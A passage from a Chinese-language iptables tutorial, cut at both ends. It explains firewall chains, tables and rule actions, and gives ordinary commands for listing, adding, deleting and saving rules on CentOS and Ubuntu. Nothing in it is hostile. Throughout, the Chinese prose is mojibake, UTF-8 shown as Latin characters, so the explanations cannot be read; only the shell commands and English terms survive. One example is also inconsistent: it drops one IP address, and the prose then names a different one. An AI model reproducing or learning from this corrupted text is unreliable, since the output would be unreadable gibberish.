¹æ®è§„åˆ™æ‰€å®šä¹‰çš„æ–¹æ³•æ¥å¤„ç†è¿™äº›æ•°æ®åŒ…ï¼Œå¦‚æ”¾è¡Œï¼ˆacceptï¼‰ã€æ‹’ç»ï¼ˆrejectï¼‰å’Œä¸¢å¼ƒï¼ˆdropï¼‰ç­‰ã€‚é…ç½®é˜²ç«å¢™çš„ä¸»è¦å·¥ä½œå°±æ˜¯æ·»åŠ ã€ä¿®æ”¹å’Œåˆ é™¤è¿™äº›è§„åˆ™ã€‚\n\n\n\n### 1.1 äº”é“¾\n\n![1](iptablesä½¿ç”¨æ•™ç¨‹/1.png)\n\n+ PREROUTING æ•°æ®åŒ…åˆšè¿›å…¥ç½‘ç»œå±‚ , è·¯ç”±ä¹‹å‰\n+ INPUT è·¯ç”±åˆ¤æ–­ï¼Œæµå…¥ç”¨æˆ·ç©ºé—´\n+ OUTPUT ç”¨æˆ·ç©ºé—´å‘å‡ºï¼Œåæ¥è·¯ç”±åˆ¤æ–­å‡ºå£çš„ç½‘ç»œæ¥å£\n+ FORWARD è·¯ç”±åˆ¤æ–­ä¸è¿›å…¥ç”¨æˆ·ç©ºé—´ï¼Œåªè¿›è¡Œè½¬å‘\n+ POSTROUTING æ•°æ®åŒ…é€šè¿‡ç½‘ç»œæ¥å£å‡ºå»\n\n\n\n##### 1.1.1 ä¸¾ä¾‹:\n\nåˆ°æœ¬æœºæŸè¿›ç¨‹çš„æŠ¥æ–‡ï¼šPREROUTING --> INPUT\n\nç”±æœ¬æœºè½¬å‘çš„æŠ¥æ–‡ï¼šPREROUTING --> FORWARD --> POSTROUTING\n\nç”±æœ¬æœºçš„æŸè¿›ç¨‹å‘å‡ºæŠ¥æ–‡ï¼ˆé€šå¸¸ä¸ºå“åº”æŠ¥æ–‡ï¼‰ï¼šOUTPUT --> POSTROUTING\n\n\n\n## 1.2 å››è¡¨\n\næˆ‘ä»¬æŠŠå…·æœ‰ç›¸åŒåŠŸèƒ½çš„è§„åˆ™çš„é›†åˆå«åš\"è¡¨\"ï¼Œæ‰€ä»¥è¯´ï¼Œä¸åŒåŠŸèƒ½çš„è§„åˆ™ï¼Œæˆ‘ä»¬å¯ä»¥æ”¾ç½®åœ¨ä¸åŒçš„è¡¨ä¸­è¿›è¡Œç®¡ç†ï¼Œè€Œiptableså·²ç»ä¸ºæˆ‘ä»¬å®šä¹‰äº†4ç§è¡¨ï¼Œæ¯ç§è¡¨å¯¹åº”äº†ä¸åŒçš„åŠŸèƒ½ï¼Œè€Œæˆ‘ä»¬å®šä¹‰çš„è§„åˆ™ä¹Ÿéƒ½é€ƒè„±ä¸äº†è¿™4ç§åŠŸèƒ½çš„èŒƒå›´ï¼Œæ‰€ä»¥ï¼Œå­¦ä¹ iptablesä¹‹å‰ï¼Œæˆ‘ä»¬å¿…é¡»å…ˆææ˜ç™½æ¯ç§è¡¨ çš„ä½œç”¨ã€‚\n\n+ filterè¡¨ï¼šè´Ÿè´£è¿‡æ»¤åŠŸèƒ½ï¼Œé˜²ç«å¢™ï¼›å†…æ ¸æ¨¡å—ï¼šiptables_filter\n+ natè¡¨ï¼šnetwork address translationï¼Œç½‘ç»œåœ°å€è½¬æ¢åŠŸèƒ½ï¼›å†…æ ¸æ¨¡å—ï¼šiptable_nat\n+ mangleè¡¨ï¼šæ‹†è§£æŠ¥æ–‡ï¼Œåšå‡ºä¿®æ”¹ï¼Œå¹¶é‡æ–°å°è£… çš„åŠŸèƒ½ï¼›iptable_mangle\n+ rawè¡¨ï¼šå…³é—­natè¡¨ä¸Šå¯ç”¨çš„è¿æ¥è¿½è¸ªæœºåˆ¶ï¼›iptable_raw\n\nä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬è‡ªå®šä¹‰çš„æ‰€æœ‰è§„åˆ™ï¼Œéƒ½æ˜¯è¿™å››ç§åˆ†ç±»ä¸­çš„è§„åˆ™ï¼Œæˆ–è€…è¯´ï¼Œæ‰€æœ‰è§„åˆ™éƒ½å­˜åœ¨äºè¿™4å¼ \"è¡¨\"ä¸­ã€‚\n\n\n\n### 1.3 è¡¨é“¾å…³ç³»\n\n| å››è¡¨/äº”é“¾ | PREROUTING | INPUT      | FORWARD | OUTPUT | POSTROUTING |\n| --------- | ---------- | ---------- | ------- | ------ | ----------- |\n| filter    |            | âˆš          | âˆš       | âˆš      |             |\n| nat       | âˆš          | âˆš(centos7) |         | âˆš      | âˆš           |\n| mangle    | âˆš          | âˆš          | âˆš       | âˆš      | âˆš           |\n| raw       | âˆš          |            |         | âˆš      |             |\n\n\n\nè¡¨çš„ä¼˜å…ˆçº§å…³ç³»:  raw --> mangle --> nat --> filter ,  raw æœ€é«˜\n\n![1](iptablesä½¿ç”¨æ•™ç¨‹/2.png)\n\n\n\n![1](iptablesä½¿ç”¨æ•™ç¨‹/4.png)\n\n# 2. è§„åˆ™\n\nè§„åˆ™æ˜¯æ ¹æ®æŒ‡å®šçš„åŒ¹é…æ¡ä»¶æ¥å°è¯•åŒ¹é…æ¯ä¸ªæµç»æ­¤å¤„çš„æŠ¥æ–‡ï¼Œä¸€æ—¦åŒ¹é…æˆåŠŸï¼Œåˆ™ç”±è§„åˆ™åé¢æŒ‡å®šçš„å¤„ç†åŠ¨ä½œè¿›è¡Œå¤„ç†ï¼›\n\n### 2.1 åŒ¹é…æ¡ä»¶\n\nåŒ¹é…æ¡ä»¶åˆ†ä¸ºåŸºæœ¬åŒ¹é…æ¡ä»¶ä¸æ‰©å±•åŒ¹é…æ¡ä»¶\n\n+ åŸºæœ¬åŒ¹é…æ¡ä»¶ï¼š\n  æºåœ°å€Source IPï¼Œç›®æ ‡åœ°å€ Destination IP\n  ä¸Šè¿°å†…å®¹éƒ½å¯ä»¥ä½œä¸ºåŸºæœ¬åŒ¹é…æ¡ä»¶ã€‚\n+ æ‰©å±•åŒ¹é…æ¡ä»¶ï¼š\n  é™¤äº†ä¸Šè¿°çš„æ¡ä»¶å¯ä»¥ç”¨äºåŒ¹é…ï¼Œè¿˜æœ‰å¾ˆå¤šå…¶ä»–çš„æ¡ä»¶å¯ä»¥ç”¨äºåŒ¹é…ï¼Œè¿™äº›æ¡ä»¶æ³›ç§°ä¸ºæ‰©å±•æ¡ä»¶ï¼Œè¿™äº›æ‰©å±•æ¡ä»¶å…¶å®ä¹Ÿæ˜¯netfilterä¸­çš„ä¸€éƒ¨åˆ†ï¼Œåªæ˜¯ä»¥æ¨¡å—çš„å½¢å¼å­˜åœ¨ï¼Œå¦‚æœæƒ³è¦ä½¿ç”¨è¿™äº›æ¡ä»¶ï¼Œåˆ™éœ€è¦ä¾èµ–å¯¹åº”çš„æ‰©å±•æ¨¡å—ã€‚\n  æºç«¯å£Source Port, ç›®æ ‡ç«¯å£Destination Port\n  ä¸Šè¿°å†…å®¹éƒ½å¯ä»¥ä½œä¸ºæ‰©å±•åŒ¹é…æ¡ä»¶\n\n### 2.2 å¤„ç†åŠ¨ä½œ\n\nå¤„ç†åŠ¨ä½œåœ¨iptablesä¸­è¢«ç§°ä¸ºtargetï¼ˆè¿™æ ·è¯´å¹¶ä¸å‡†ç¡®ï¼Œæˆ‘ä»¬æš‚ä¸”è¿™æ ·ç§°å‘¼ï¼‰ï¼ŒåŠ¨ä½œä¹Ÿå¯ä»¥åˆ†ä¸ºåŸºæœ¬åŠ¨ä½œå’Œæ‰©å±•åŠ¨ä½œã€‚\næ­¤å¤„åˆ—å‡ºä¸€äº›å¸¸ç”¨çš„åŠ¨ä½œï¼Œä¹‹åçš„æ–‡ç« ä¼šå¯¹å®ƒä»¬è¿›è¡Œè¯¦ç»†çš„ç¤ºä¾‹ä¸æ€»ç»“ï¼š\n\n+ ACCEPTï¼šå…è®¸æ•°æ®åŒ…é€šè¿‡ã€‚\n+ DROPï¼šç›´æ¥ä¸¢å¼ƒæ•°æ®åŒ…ï¼Œä¸ç»™ä»»ä½•å›åº”ä¿¡æ¯ï¼Œè¿™æ—¶å€™å®¢æˆ·ç«¯ä¼šæ„Ÿè§‰è‡ªå·±çš„è¯·æ±‚æ³¥ç‰›å…¥æµ·äº†ï¼Œè¿‡äº†è¶…æ—¶æ—¶é—´æ‰ä¼šæœ‰ååº”ã€‚\n+ REJECTï¼šæ‹’ç»æ•°æ®åŒ…é€šè¿‡ï¼Œå¿…è¦æ—¶ä¼šç»™æ•°æ®å‘é€ç«¯ä¸€ä¸ªå“åº”çš„ä¿¡æ¯ï¼Œå®¢æˆ·ç«¯åˆšè¯·æ±‚å°±ä¼šæ”¶åˆ°æ‹’ç»çš„ä¿¡æ¯ã€‚\n+ SNATï¼šæºåœ°å€è½¬æ¢ï¼Œè§£å†³å†…ç½‘ç”¨æˆ·ç”¨åŒä¸€ä¸ªå…¬ç½‘åœ°å€ä¸Šç½‘çš„é—®é¢˜ã€‚\n+ MASQUERADEï¼šæ˜¯SNATçš„ä¸€ç§ç‰¹æ®Šå½¢å¼ï¼Œé€‚ç”¨äºåŠ¨æ€çš„ã€ä¸´æ—¶ä¼šå˜çš„ipä¸Šã€‚\n+ DNATï¼šç›®æ ‡åœ°å€è½¬æ¢ã€‚\n+ REDIRECTï¼šåœ¨æœ¬æœºåšç«¯å£æ˜ å°„ã€‚\n+ LOGï¼šåœ¨/var/log/messagesæ–‡ä»¶ä¸­è®°å½•æ—¥å¿—ä¿¡æ¯ï¼Œç„¶åå°†æ•°æ®åŒ…ä¼ é€’ç»™ä¸‹ä¸€æ¡è§„åˆ™ï¼Œä¹Ÿå°±æ˜¯è¯´é™¤äº†è®°å½•ä»¥å¤–ä¸å¯¹æ•°æ®åŒ…åšä»»ä½•å…¶ä»–æ“ä½œï¼Œä»ç„¶è®©ä¸‹ä¸€æ¡è§„åˆ™å»åŒ¹é…ã€‚\n\nè¡¥å……ä¸€ä¸‹DROPå’ŒREJECTçš„åŒºåˆ«ã€‚DROPæ˜¯ç›´æ¥æŠŠåŒ¹é…åˆ°çš„æŠ¥æ–‡ä¸¢å¼ƒï¼ŒREJECTé™¤äº†æŠŠæŠ¥æ–‡ä¸¢å¼ƒè¿˜ä¼šç»™è¯¥æŠ¥æ–‡ä¸­çš„æºIPå‘ä¸€ä¸ªICMPæŠ¥æ–‡è¯´æ˜ç›®çš„ä¸å¯è¾¾(ç›´æ¥å›å¤ä¸å¯è¾¾, æ›´å¼ºç¡¬)ã€‚å‰è€…æŠ¥æ–‡å‘é€æ–¹åªèƒ½ç­‰è¶…æ—¶ï¼Œè€Œåè€…å‘é€æ–¹å› ä¸ºæ”¶åˆ°äº†ICMPä¸å¯è¾¾æ‰€ä»¥é©¬ä¸Šå°±ç»™å‡ºäº†æç¤ºã€‚\n\n\n\n# 3. filterè¿‡æ»¤è§„åˆ™\n\nfilterè´Ÿè´£è¿‡æ»¤åŠŸèƒ½ï¼Œæ¯”å¦‚å…è®¸å“ªäº›IPåœ°å€è®¿é—®ï¼Œæ‹’ç»å“ªäº›IPåœ°å€è®¿é—®ï¼Œå…è®¸è®¿é—®å“ªäº›ç«¯å£ï¼Œç¦æ­¢è®¿é—®å“ªäº›ç«¯å£ï¼Œfilterè¡¨ä¼šæ ¹æ®æˆ‘ä»¬å®šä¹‰çš„è§„åˆ™è¿›è¡Œè¿‡æ»¤ï¼Œfilterè¡¨åº”è¯¥æ˜¯æˆ‘ä»¬æœ€å¸¸ç”¨åˆ°çš„è¡¨äº†ã€‚\n\n### 3.1 æŸ¥çœ‹è§„åˆ™\n\næ€æ ·æŸ¥çœ‹filterè¡¨ä¸­çš„è§„åˆ™å‘¢ï¼Ÿä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å³å¯æŸ¥çœ‹ã€‚\n\n```bash\niptables -t filter -L\n```\n\nåˆšæ‰æåˆ°ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨iptables -t filter -Lå‘½ä»¤åˆ—å‡ºfilterè¡¨ä¸­çš„æ‰€æœ‰è§„åˆ™ï¼Œé‚£ä¹ˆä¸¾ä¸€åä¸‰ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æŸ¥çœ‹å…¶å®ƒè¡¨ä¸­çš„è§„åˆ™ï¼Œç¤ºä¾‹å¦‚ä¸‹ã€‚\n\n```bash\niptables -t raw -L\niptables -t mangle -L\niptables -t nat -L\n```\n\nå…¶å®ï¼Œæˆ‘ä»¬å¯ä»¥çœç•¥-t filterï¼Œå½“æ²¡æœ‰ä½¿ç”¨-té€‰é¡¹æŒ‡å®šè¡¨æ—¶ï¼Œé»˜è®¤ä¸ºæ“ä½œfilterè¡¨ï¼Œå³iptables -Lè¡¨ç¤ºåˆ—å‡ºfilterè¡¨ä¸­çš„æ‰€æœ‰è§„åˆ™ã€‚\n\n\n\n### 3.2 è¯¦ç»†ä¿¡æ¯\n\næˆ‘ä»¬è¿˜å¯ä»¥åªæŸ¥çœ‹æŒ‡å®šè¡¨ä¸­çš„æŒ‡å®šé“¾çš„è§„åˆ™ï¼Œæ¯”å¦‚ï¼Œæˆ‘ä»¬åªæŸ¥çœ‹filterè¡¨ä¸­INPUTé“¾çš„è§„åˆ™ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼ˆæ³¨æ„å¤§å°å†™ï¼‰ã€‚\n\n```bash\n# iptables --line-numbers  -nvL INPUT\nChain INPUT (policy ACCEPT 14M packets, 2062M bytes)\nnum   pkts bytes target     prot opt in     out     source               destination\n1    2697K  114M KUBE-SERVICES  all  --  *      *       0.0.0.0/0            0.0.0.0/0            ctstate NEW /* kubernetes service portals */\n2    2697K  114M KUBE-EXTERNAL-SERVICES  all  --  *      *       0.0.0.0/0            0.0.0.0/0            ctstate NEW /* kubernetes externally-visible service portals */\n3     906M  477G KUBE-FIREWALL  all  --  *      *       0.0.0.0/0            0.0.0.0/0\n```\n\n+ å¤´å«ä¹‰\n\n  ä¸Šå›¾ä¸­INPUTé“¾åé¢çš„æ‹¬å·ä¸­åŒ…å«policy ACCEPT ï¼Œ0 packetsï¼Œ0bytes ä¸‰éƒ¨åˆ†ã€‚\n\n  ```ini\n  policy:è¡¨ç¤ºå½“å‰é“¾çš„é»˜è®¤ç­–ç•¥ï¼Œpolicy ACCEPTè¡¨ç¤ºä¸Šå›¾ä¸­INPUTçš„é“¾çš„é»˜è®¤åŠ¨ä½œä¸ºACCEPT\n  packets:è¡¨ç¤ºå½“å‰é“¾ï¼ˆä¸Šä¾‹ä¸ºINPUTé“¾ï¼‰é»˜è®¤ç­–ç•¥åŒ¹é…åˆ°çš„åŒ…çš„æ•°é‡ï¼Œ0 packetsè¡¨ç¤ºé»˜è®¤ç­–ç•¥åŒ¹é…åˆ°0ä¸ªåŒ…ã€‚\n  bytes:è¡¨ç¤ºå½“å‰é“¾é»˜è®¤ç­–ç•¥åŒ¹é…åˆ°çš„æ‰€æœ‰åŒ…çš„å¤§å°æ€»å’Œã€‚\n  ```\n\n  å…¶å®ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠpacketsä¸bytesç§°ä½œ\"è®¡æ•°å™¨\"ï¼Œä¸Šå›¾ä¸­çš„è®¡æ•°å™¨è®°å½•äº†é»˜è®¤ç­–ç•¥åŒ¹é…åˆ°çš„æŠ¥æ–‡æ•°é‡ä¸æ€»å¤§å°ï¼Œ\"è®¡æ•°å™¨\"åªä¼šåœ¨ä½¿ç”¨-vé€‰é¡¹æ—¶ï¼Œæ‰ä¼šæ˜¾ç¤ºå‡ºæ¥ã€‚\n\n  \n\n+ å­—æ®µå«ä¹‰\n\n  ```ini\n  pkts:å¯¹åº”è§„åˆ™åŒ¹é…åˆ°çš„æŠ¥æ–‡çš„ä¸ªæ•°ã€‚\n  bytes:å¯¹åº”åŒ¹é…åˆ°çš„æŠ¥æ–‡åŒ…çš„å¤§å°æ€»å’Œã€‚\n  target:è§„åˆ™å¯¹åº”çš„targetï¼Œå¾€å¾€è¡¨ç¤ºè§„åˆ™å¯¹åº”çš„\"åŠ¨ä½œ\"ï¼Œå³è§„åˆ™åŒ¹é…æˆåŠŸåéœ€è¦é‡‡å–çš„æªæ–½ã€‚\n  prot:è¡¨ç¤ºè§„åˆ™å¯¹åº”çš„åè®®ï¼Œæ˜¯å¦åªé’ˆå¯¹æŸäº›åè®®åº”ç”¨æ­¤è§„åˆ™ã€‚\n  opt:è¡¨ç¤ºè§„åˆ™å¯¹åº”çš„é€‰é¡¹ã€‚\n  in:è¡¨ç¤ºæ•°æ®åŒ…ç”±å“ªä¸ªæ¥å£(ç½‘å¡)æµå…¥ï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½®é€šè¿‡å“ªå—ç½‘å¡æµå…¥çš„æŠ¥æ–‡éœ€è¦åŒ¹é…å½“å‰è§„åˆ™ã€‚\n  out:è¡¨ç¤ºæ•°æ®åŒ…ç”±å“ªä¸ªæ¥å£(ç½‘å¡)æµå‡ºï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½®é€šè¿‡å“ªå—ç½‘å¡æµå‡ºçš„æŠ¥æ–‡éœ€è¦åŒ¹é…å½“å‰è§„åˆ™ã€‚\n  source:è¡¨ç¤ºè§„åˆ™å¯¹åº”çš„æºå¤´åœ°å€ï¼Œå¯ä»¥æ˜¯ä¸€ä¸ªIPï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªç½‘æ®µã€‚\n  destination:è¡¨ç¤ºè§„åˆ™å¯¹åº”çš„ç›®æ ‡åœ°å€ã€‚å¯ä»¥æ˜¯ä¸€ä¸ªIPï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªç½‘æ®µã€‚\n  ```\n\n  \n\n### 3.3 å¢åŠ è§„åˆ™\n\nä¸ºäº†å‡†å¤‡ä¸€ä¸ªä»é›¶å¼€å§‹çš„ç¯å¢ƒï¼Œä½¿ç”¨`iptables -F INPUT`å‘½ä»¤æ¸…ç©ºfilterè¡¨INPUTé“¾ä¸­çš„è§„åˆ™ã€‚\n\n```bash\nroot@tencent:~# iptables -nvL INPUT\nChain INPUT (policy ACCEPT 215 packets, 16538 bytes)\n pkts bytes target     prot opt in     out     source               destination\n```\n\næ¸…ç©ºINPUTé“¾ä»¥åï¼Œfilterè¡¨ä¸­çš„INPUTé“¾å·²ç»ä¸å­˜åœ¨ä»»ä½•çš„è§„åˆ™ï¼Œä½†æ˜¯å¯ä»¥çœ‹å‡ºï¼ŒINPUTé“¾çš„é»˜è®¤ç­–ç•¥æ˜¯ACCEPTï¼Œä¹Ÿå°±æ˜¯è¯´ï¼ŒINPUTé“¾é»˜è®¤\"æ”¾è¡Œ\"æ‰€æœ‰å‘å¾€æœ¬æœºçš„æŠ¥æ–‡ï¼Œå½“æ²¡æœ‰ä»»ä½•è§„åˆ™æ—¶ï¼Œä¼šæ¥å—æ‰€æœ‰æŠ¥æ–‡ï¼Œå½“æŠ¥æ–‡æ²¡æœ‰è¢«ä»»ä½•è§„åˆ™åŒ¹é…åˆ°æ—¶ï¼Œä¹Ÿä¼šé»˜è®¤æ”¾è¡ŒæŠ¥æ–‡ã€‚\n\n\n\n+ å¢åŠ \n\n```bash\niptables -t filter -I INPUT -s 123.117.179.97 -j DROP\n```\n\nåœ¨ç›®æ ‡æœåŠ¡å™¨å¢åŠ ä¸€æ¡æœ¬åœ°çš„ ip, å‘ç°å·²ç» pingä¸é€šäº†.\n\nä¸Šå›¾ä¸­ï¼Œä½¿ç”¨ -té€‰é¡¹æŒ‡å®šäº†è¦æ“ä½œçš„è¡¨ï¼Œæ­¤å¤„æŒ‡å®šäº†æ“ä½œfilterè¡¨ï¼Œä¸ä¹‹å‰çš„æŸ¥çœ‹å‘½ä»¤ä¸€æ ·ï¼Œä¸ä½¿ç”¨-té€‰é¡¹æŒ‡å®šè¡¨æ—¶ï¼Œé»˜è®¤ä¸ºæ“ä½œfilterè¡¨ã€‚\nä½¿ç”¨-Ié€‰é¡¹ï¼ŒæŒ‡æ˜å°†\"è§„åˆ™\"æ’å…¥è‡³å“ªä¸ªé“¾ä¸­ï¼Œ-Iè¡¨ç¤ºinsertï¼Œå³æ’å…¥çš„æ„æ€ï¼Œæ‰€ä»¥-I INPUTè¡¨ç¤ºå°†è§„åˆ™æ’å…¥äºINPUTé“¾ä¸­ï¼Œå³æ·»åŠ è§„åˆ™ä¹‹æ„ã€‚\n\nä½¿ç”¨-sé€‰é¡¹ï¼ŒæŒ‡æ˜\"åŒ¹é…æ¡ä»¶\"ä¸­çš„\"æºåœ°å€\"ï¼Œå³å¦‚æœæŠ¥æ–‡çš„æºåœ°å€å±äº-så¯¹åº”çš„åœ°å€ï¼Œé‚£ä¹ˆæŠ¥æ–‡åˆ™æ»¡è¶³åŒ¹é…æ¡ä»¶ï¼Œ-sä¸ºsourceä¹‹æ„ï¼Œè¡¨ç¤ºæºåœ°å€ã€‚\n\nä½¿ç”¨-jé€‰é¡¹ï¼ŒæŒ‡æ˜å½“\"åŒ¹é…æ¡ä»¶\"è¢«æ»¡è¶³æ—¶ï¼Œæ‰€å¯¹åº”çš„åŠ¨ä½œï¼Œä¸Šä¾‹ä¸­æŒ‡å®šçš„åŠ¨ä½œä¸ºDROPï¼Œåœ¨ä¸Šä¾‹ä¸­ï¼Œå½“æŠ¥æ–‡çš„æºåœ°å€ä¸º223.70.253.1æ—¶ï¼ŒæŠ¥æ–‡åˆ™è¢«DROPï¼ˆä¸¢å¼ƒï¼‰ã€‚\n\n\n\n+ æŸ¥çœ‹\n\nå†æ¬¡æŸ¥çœ‹filterè¡¨ä¸­çš„INPUTé“¾ï¼Œå‘ç°è§„åˆ™å·²ç»è¢«æ·»åŠ äº†ï¼Œåœ¨iptablesä¸­ï¼ŒåŠ¨ä½œè¢«ç§°ä¹‹ä¸º\"target\"ï¼Œæ‰€ä»¥ï¼Œä¸Šå›¾ä¸­tagetå­—æ®µå¯¹åº”çš„åŠ¨ä½œä¸ºDROPã€‚\n\n```bash\nroot@tencent:~# iptables -vL INPUT\nChain INPUT (policy ACCEPT 2043 packets, 135K bytes)\n pkts bytes target     prot opt in     out     source               destination         \n   66  9796 DROP       all  --  any    any     123.117.179.97       anywhere  \n```\n\næ³¨æ„çœ‹, å¯ä»¥çœ‹åˆ° bytes çš„å­—èŠ‚æ•°, è¯´æ˜å·²ç»åŒ¹é…ä¸Šäº†.\n\n\n\n+ é¡ºåº\n\nè§„åˆ™çš„é¡ºåºå¾ˆé‡è¦ã€‚\n\nå¦‚æœæŠ¥æ–‡å·²ç»è¢«å‰é¢çš„è§„åˆ™åŒ¹é…åˆ°ï¼Œiptablesåˆ™ä¼šå¯¹æŠ¥æ–‡æ‰§è¡Œå¯¹åº”çš„åŠ¨ä½œï¼Œå³ä½¿åé¢çš„è§„åˆ™ä¹Ÿèƒ½åŒ¹é…åˆ°å½“å‰æŠ¥æ–‡ï¼Œå¾ˆæœ‰å¯èƒ½ä¹Ÿæ²¡æœ‰æœºä¼šå†å¯¹æŠ¥æ–‡æ‰§è¡Œç›¸åº”çš„åŠ¨ä½œã€‚\n\n\n\n### 3.4 åˆ é™¤è§„åˆ™\n\næ­¤åˆ»ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦åˆ é™¤filterè¡¨ä¸­INPUTä¸­çš„ä¸€æ¡è§„åˆ™ï¼Œè¯¥æ€ä¹ˆåšå‘¢ï¼Ÿæœ‰ä¸¤ç§åŠæ³•\næ–¹æ³•ä¸€ï¼šæ ¹æ®è§„åˆ™çš„ç¼–å·å»åˆ é™¤è§„åˆ™\næ–¹æ³•äºŒï¼šæ ¹æ®å…·ä½“çš„åŒ¹é…æ¡ä»¶ä¸åŠ¨ä½œåˆ é™¤è§„åˆ™\n\n```bash\n# æ·»åŠ ä¸¤ç§\niptables -t filter -A INPUT -s 1.1.1.1 -j DROP\niptables -t filter -A INPUT -s 1.1.1.2 -j DROP\n\n\niptables --line -nvL INPUT\n3        0     0 DROP       all  --  *      *       1.1.1.1              0.0.0.0/0           \n4        0     0 DROP       all  --  *      *       1.1.1.2              0.0.0.0/0  \n\n\n# ä¸¤ç§åˆ é™¤æ–¹å¼\niptables -D INPUT 3\niptables -D INPUT -s 1.1.1.2 -j DROP\n```\n\n\n\n+ åˆ é™¤æ‰€æœ‰\n\n  è€Œåˆ é™¤æŒ‡å®šè¡¨ä¸­æŸæ¡é“¾ä¸­çš„æ‰€æœ‰è§„åˆ™çš„å‘½ä»¤ï¼Œæˆ‘ä»¬åœ¨ä¸€å¼€å§‹å°±ä½¿ç”¨åˆ°äº†ï¼Œå°±æ˜¯\"iptables -t è¡¨å -F é“¾å\"\n  -Fé€‰é¡¹ä¸ºflushä¹‹æ„ï¼Œå³å†²åˆ·æŒ‡å®šçš„é“¾ï¼Œå³åˆ é™¤æŒ‡å®šé“¾ä¸­çš„æ‰€æœ‰è§„åˆ™ï¼Œä½†æ˜¯æ³¨æ„ï¼Œæ­¤æ“ä½œç›¸å½“äºåˆ é™¤æ“ä½œï¼Œåœ¨æ²¡æœ‰ä¿å­˜iptablesè§„åˆ™çš„æƒ…å†µä¸‹ï¼Œè¯·æ…ç”¨ã€‚\n\n\n\n### 3.5 ä¿®æ”¹è§„åˆ™\n\nå»ºè®®åˆ é™¤åå†æ–°å¢\n\n+ ä¿®æ”¹é»˜è®¤ç­–ç•¥\n  ä½¿ç”¨-tæŒ‡å®šè¦æ“ä½œçš„è¡¨ï¼Œä½¿ç”¨-Pé€‰é¡¹æŒ‡å®šè¦ä¿®æ”¹çš„é“¾ï¼Œä¸‹ä¾‹ä¸­ï¼Œ`-P FORWARD ACCEPT`è¡¨ç¤ºå°†è¡¨ä¸­FORWRDé“¾çš„é»˜è®¤ç­–ç•¥æ”¹ä¸ºACCEPTã€‚\n\n  ```bash\n  iptables --line -nvL FORWARD\n  Chain FORWARD (policy DROP 0 packets, 0 bytes)\n  \n  # æ‰§è¡Œä¿®æ”¹é»˜è®¤\n  iptables -P FORWARD ACCEPT\n  \n  iptables --line -nvL FORWARD\n  Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)\n  ```\n\n  \n\n### 3.6 ä¿å­˜è§„åˆ™\n\nåœ¨é»˜è®¤çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯¹\"é˜²ç«å¢™\"æ‰€åšå‡ºçš„ä¿®æ”¹éƒ½æ˜¯\"ä¸´æ—¶çš„\"ï¼Œæ¢å¥è¯è¯´å°±æ˜¯ï¼Œå½“é‡å¯iptablesæœåŠ¡æˆ–è€…é‡å¯æœåŠ¡å™¨ä»¥åï¼Œæˆ‘ä»¬å¹³å¸¸æ·»åŠ çš„è§„åˆ™æˆ–è€…å¯¹è§„åˆ™æ‰€åšå‡ºçš„ä¿®æ”¹éƒ½å°†æ¶ˆå¤±ï¼Œä¸ºäº†é˜²æ­¢è¿™ç§æƒ…å†µçš„å‘ç”Ÿï¼Œæˆ‘ä»¬éœ€è¦å°†è§„åˆ™\"ä¿å­˜\"ã€‚\n\n+ centos\n\n  centos6ä¸­ï¼Œä½¿ç”¨\"service iptables save\"å‘½ä»¤å³å¯ä¿å­˜è§„åˆ™ï¼Œè§„åˆ™é»˜è®¤ä¿å­˜åœ¨/etc/sysconfig/iptablesæ–‡ä»¶ä¸­\n\n  ```bash\n  service iptables save\n  ```\n\n  centos7ä¸­ï¼Œä½¿ç”¨firewallæ›¿ä»£äº†åŸæ¥çš„iptables service\n\n  ```bash\n  firewall-cmd --zone=public --add-port=3000/tcp --permanent\n  firewall-cmd --reload\n  \n  # ä¹Ÿå¯ä»¥å®‰è£… iptables-service\n  yum install -y iptables-services\n  systemctl disable firewalld\n  systemctl enable iptables\n  service iptables save\n  ```\n\n  è¿˜å¯ä»¥ä½¿ç”¨å¦ä¸€ç§æ–¹æ³•ä¿å­˜iptablesè§„åˆ™ï¼Œå°±æ˜¯ä½¿ç”¨iptables-saveå‘½ä»¤\n  ä½¿ç”¨iptables-saveå¹¶ä¸èƒ½ä¿å­˜å½“å‰çš„iptablesè§„åˆ™ï¼Œä½†æ˜¯å¯ä»¥å°†å½“å‰çš„iptablesè§„åˆ™ä»¥\"ä¿å­˜åçš„æ ¼å¼\"è¾“å‡ºåˆ°å±å¹•ä¸Šã€‚å¯ä»¥ä½¿ç”¨iptables-saveå‘½ä»¤ï¼Œå†é…åˆé‡å®šå‘\n\n  ```bash\n  iptables-save > /etc/sysconfig/iptables\n  iptables-restore < /etc/sysconfig/iptables\n  ```\n\n+ ubuntu\n\n  ```bash\n  sudo apt-get install iptables-persistent\n  \n  sudo /etc/init.d/iptables-persistent save \n  sudo /etc/init.d/iptables-persistent reload\n  \n  # Ubuntu 16.04 Server\n  sudo netfilter-persistent save\n  sudo netfilter-persistent reload\n  ```\n\n\n\n# 4. åŒ¹é…æ¡ä»¶\n\n### 4.1 åŒ¹é…æ–¹å¼\n\n```bash\n# å•ä¸ªåŒ¹é…\niptables -I INPUT -s 1.1.1.2 -j DROP\n\n# å¤šä¸ªåŒ¹é…\niptables -I INPUT -s 1.1.1.3,1.1.1.4 -j DROP\n\n# ç½‘æ®µåŒ¹é…\niptables -I INPUT -s 1.1.1.5/23 -j DROP\n\n# å–ååŒ¹é…\niptables -I INPUT ! -s 1.1.1.6 -j ACCEPT\n```\n\n\n\n+ å–åæ³¨æ„ç‚¹\n\nä½¿ç”¨ \"!\" 